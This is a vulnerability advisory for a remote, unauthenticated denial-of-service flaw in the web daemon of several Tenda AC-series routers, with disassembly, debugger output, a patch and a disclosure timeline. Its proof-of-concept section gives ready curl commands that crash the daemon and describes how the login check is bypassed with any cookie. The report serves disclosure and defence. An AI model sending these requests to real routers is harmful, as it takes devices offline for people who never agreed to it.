# Tenda AC series formWifiWpsOOB NULL pointer dereference

A remote denial-of-service vulnerability in the web management service (`bin/httpd`) of
multiple Tenda AC-series routers. A **single HTTP request** that omits the `index`
parameter causes `atoi(NULL)` to dereference address `0x0` and terminates the HTTP daemon.

- **CWE**: CWE-476 (NULL Pointer Dereference)
- **CVSS 3.1**: 7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`
- **CVE**: pending (reported through the VulDB CNA process)

---

## Version

Each entry below was reproduced on a running instance of the vendor's unmodified firmware,
and each is the release the vendor currently publishes for that model.

| Device | Firmware | Architecture | Verified |
|---|---|---|---|
| Tenda AC6 | `15.03.05.19` | ARM | reproduced |
| Tenda AC9 v1.0 | `15.03.05.19 (6318)` | ARM | reproduced + debugger |
| Tenda AC15 | `15.03.05.19` | ARM | reproduced |
| Tenda AC18 | `15.03.05.19 (6318)` | ARM | reproduced |
| Tenda AC10U | `15.03.06.48` | MIPSEL | reproduced |

Firmware download (vendor):

```
AC6      https://www.tenda.com.cn/  (AC6 v1.0 support page — V15.03.05.19)
AC9      https://www.tenda.com.cn/  (AC9 v1.0 support page — V15.03.05.19 (6318))
AC15     https://static.tenda.com.cn/tdcweb/download/uploadfile/AC15/US_AC15V1.0BR_V15.03.05.19_multi_TD01.zip
AC18     https://www.tenda.com.cn/  (AC18 support page — V15.03.05.19 (6318))
AC10U    https://www.tendacn.com/material/show/103170
```

Note on version currency: the AC6 archive used here is **byte-identical** (SHA256
`621ce4eeef735afacfbe877f0e6f3d05f9cbd9146d72321c674f4bae2372aa1b`) to the file the vendor
serves today. AC10U `15.03.06.48` was published 2026-07-13. Details in
[`evidence/07-version-currency.md`](evidence/07-version-currency.md).

---

## Vulnerability Description

The function `formWifiWpsOOB` in the web management service reads the request parameter
`index` through a getter whose default value is `NULL`, and passes the result directly to
`atoi()` without validating it. When the request does not carry `index` (absent, empty, or
malformed), the getter returns `NULL`, `atoi(NULL)` descends into the C library's `strtol`,
and the character-scanning loop reads a byte from address `0x0`, raising SIGSEGV.

The service terminates immediately and produces no response. The device's web management
interface stays unavailable until the device is restarted; repeating the request keeps it
down.

**Attack characteristics:** remote · no authentication · no user interaction · single
request · deterministic.

---

## Vulnerability Details

### The missing check

```c
index = websGetVar(wp, "index", NULL);   /* returns NULL when the parameter is absent */
...
atoi(index);                             /* <-- dereference; no guard */
printf(...);                             /* the result is then used */
...
if (index == NULL) { /* error handling */ }   /* <-- the guard exists, 44 bytes too late */
```

### In the firmware

AC9 `bin/httpd`, ARM 32-bit, uClibc. The symbol table gives `formWifiWpsOOB` at `0x9b674`,
size 776.

```asm
; index = websGetVar(wp, "index", NULL)
09b6b8  mov  r1, r3
09b6bc  mov  r2, #0            ; default = NULL
09b6c0  bl   0x9e0b8
09b6c4  str  r0, [fp, #-16]    ; save the index pointer

; atoi(index)                  <-- no guard of any kind
09b71c  ldr  r0, [fp, #-16]
09b720  bl   atoi@plt          ; crash site

; if (index == NULL) { ... }   <-- guard, 44 bytes later
09b748  ldr  r3, [fp, #-16]
09b74c  cmp  r3, #0
09b750  bne  0x9b7b4
```

Full annoted disassembly: [`evidence/01-disassembly.md`](evidence/01-disassembly.md)

### The crash

Captured under `gdb-multiarch` attached to QEMU's gdb stub:

```
Program received signal SIGSEGV, Segmentation fault.
pc = 0x3fdedafc    r0 = 0x0    r6 = 0x0

=> 0x3fdedafc:  ldrb  r3, [r6]      ; read from address 0x0
   0x3fdedb00:  ldr   r12, [r2]
   0x3fdedb04:  lsl   r1, r3, #1
   0x3fdedb08:  ldrh  r7, [r12, r1]  ; 16-bit character-class lookup

gdb> x/4xb $r6
Cannot access memory at address 0x0
```

Cross-checked against the firmware's own `libuClibc`: the faulting instruction is inside
`strtol` (`atoi` is a thin wrapper over it), and the bytes at the matching offset are
identical. See [`evidence/03-strtol-crosscheck.md`](evidence/03-strtol-crosscheck.md).

The caller was confirmed from the guest stack — the saved return address `0x9b724` is the
instruction immediately after `bl atoi` in `formWifiWpsOOB`. See
[`evidence/02-gdb-crash.md`](evidence/02-gdb-crash.md).

### Why it is not the well-known overflow

The same parameter of the same function has been assigned several CVE IDs — **all of them
stack-based buffer overflows**. This report describes a different defect:

| | Existing CVEs | This issue |
|---|---|---|
| Code | `sprintf(buf[24], "%s;%s", index, "1")` | `atoi(index)` where `index` may be NULL |
| CWE | CWE-121 (and 120/787/119) | **CWE-476** |
| Trigger | `index` **≥ 22 bytes** | `index` **absent or empty** |
| Faulting instruction | in `httpd` (`0x9b85c`–`0x9b87c`), on return | in libc `strtol` (`0x3fdedafc`), immediately |
| Response before dying | `200 OK`, then crash | no response at all |
| Relationship | **mutually exclusive** — a value cannot trigger this bug, its absence cannot trigger the overflow |

Across the whole AC9 `httpd` (205,838 instructions) there is exactly **one** site where a
getter with a `NULL` default is used without a preceding guard — this one. The two sibling
handlers that read the *same parameter name* guard it correctly, so this is an omission,
not a design choice.

Full comparison: [`docs/differentiation.md`](docs/differentiation.md) ·
Scan results: [`evidence/05-uniqueness-scan.md`](evidence/05-uniqueness-scan.md)

### Authentication

The gate only checks that a cookie named `password` **exists** — its value is never
validated:

```
Cookie: password=x     -> passes
Cookie: password=zzz   -> passes
(no cookie)            -> 302 redirect
```

So the vulnerability requires no credentials.

---

## POC / EXP

The shortest form — one request:

```bash
curl -s "http://192.168.0.1/goform/WifiWpsOOB" -H "Cookie: password=x"
```

If a build answers `302` first, obtain the server-issued cookie and repeat:

```bash
COOKIE=$(curl -si "http://192.168.0.1/goform/WifiWpsOOB" \
         | grep -i '^set-cookie:' | head -1 | cut -d' ' -f2 | cut -d';' -f1)
curl -s "http://192.168.0.1/goform/WifiWpsOOB" -H "Cookie: $COOKIE"
```

Included scripts perform the baseline/trigger pair and report a verdict:

```bash
./poc.sh 192.168.0.1          # bash
python3 poc.py 192.168.0.1    # python
```

### Trigger matrix (measured)

| Request | Result |
|---|---|
| `GET /goform/WifiWpsOOB` + any cookie | **crash** |
| `POST`, body empty | **crash** |
| `POST`, body without `index` (`foo=1`) | **crash** |
| `POST`, `index=` (empty value) | **crash** |
| `POST`, `index` (no `=`) | **crash** |
| `POST`, `index=1` | `200 OK` |
| `POST`, no cookie | `302` (auth gate) |
| `POST`, `Content-Length` mismatch | no crash |

### Observed behaviour

The connection is closed with no HTTP response; the `httpd` process is gone; subsequent
connections are refused until the device restarts. Per-device records:
[`evidence/06-per-model-verification.md`](evidence/06-per-model-verification.md)

---

## Impact

Remote denial of service. The web management daemon is the only administrative interface;
once it terminates the device cannot be configured over HTTP until it is rebooted, and
repeating the request keeps it down.

No code-execution claim is made: escalating a NULL dereference on ARM/MIPS would require
mapping address 0, which is not attainable here.

---

## Fix

```diff
  index = websGetVar(wp, "index", NULL);
+ if (index == NULL) {
+     /* handle the missing parameter */
+     return;
+ }
  idx = atoi(index);
```

or, minimally:

```diff
- index = websGetVar(wp, "index", NULL);
+ index = websGetVar(wp, "index", "");
```

The two sibling handlers (`formWifiWpsStart`, `formWifiStatus`) already do this correctly —
the same structure can simply be copied. Audit guidance and the full patch discussion:
[`docs/fix.md`](docs/fix.md)

---

## Evidence index

| File | Contents |
|---|---|
| [`evidence/01-disassembly.md`](evidence/01-disassembly.md) | Annotated disassembly of `formWifiWpsOOB` |
| [`evidence/02-gdb-crash.md`](evidence/02-gdb-crash.md) | Debugger capture, registers, fault address, caller identification |
| [`evidence/03-strtol-crosscheck.md`](evidence/03-strtol-crosscheck.md) | Fault site matched against the firmware's own uClibc |
| [`evidence/04-trigger-matrix.md`](evidence/04-trigger-matrix.md) | Trigger matrix as measured |
| [`evidence/05-uniqueness-scan.md`](evidence/05-uniqueness-scan.md) | Whole-binary scan for the same pattern |
| [`evidence/06-per-model-verification.md`](evidence/06-per-model-verification.md) | Per-device reproduction records |
| [`evidence/07-version-currency.md`](evidence/07-version-currency.md) | Affected version vs. the vendor's current listings |
| [`docs/differentiation.md`](docs/differentiation.md) | Why this is not the known overflow |
| [`docs/novelty-check.md`](docs/novelty-check.md) | Novelty check against NVD and CNVD |
| [`docs/fix.md`](docs/fix.md) | Remediation and audit guidance |
| [`docs/reproduce-and-screenshots.md`](docs/reproduce-and-screenshots.md) | Commands to regenerate every capture |

**Test environment**: QEMU user-mode emulation (`qemu-arm`, `qemu-mipsel-static`) running the
vendor's unmodified firmware root filesystems, with `gdb-multiarch` attached through the QEMU
gdb stub. The crash was captured twice independently (POST and GET triggers). No physical
hardware was used.

---

## Timeline

| Date | Event |
|---|---|
| 2026-10-08 | Defect identified during a firmware review |
| 2026-10-09 | Root cause confirmed under a debugger; call chain proven |
| 2026-10-09 | All five models reproduced; version currency verified against the vendor |
| — | Vendor notified |
| — | Reported to VulDB (CVE pending) |

---

## Disclaimer

Published for defensive and educational purposes under responsible disclosure. Do not use
these scripts against devices you do not own or are not authorised to test.
